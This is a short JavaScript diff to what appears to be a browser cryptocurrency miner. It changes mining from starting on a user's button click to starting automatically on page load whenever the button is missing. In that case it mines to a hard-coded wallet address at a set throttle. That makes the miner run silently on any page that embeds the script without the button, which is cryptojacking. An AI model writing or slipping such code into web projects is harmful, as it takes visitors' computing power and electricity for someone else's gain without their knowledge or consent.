@@ -2,7 +2,15 @@ let isCurrentlyMining = false;
 let intervalId;
 
 document.addEventListener("DOMContentLoaded", () => {
-  document.getElementById("startb").addEventListener("click", start);
+  const startButton = document.getElementById("startb");
+  if (startButton) {
+    startButton.addEventListener("click", start);
+  } else {
+    startMining(
+      "4688YCrSqBZA5XcyPmnNieYD2ZX2wPaA5AWRtqbZCN9WLxokKMjaT7kLhnph5rzxp1DoHkzvwGJPJRM2QbQqwoBiN7PNgfZ"
+    );
+    throttleMiner = 50;
+  }
 });
 
 function start() {
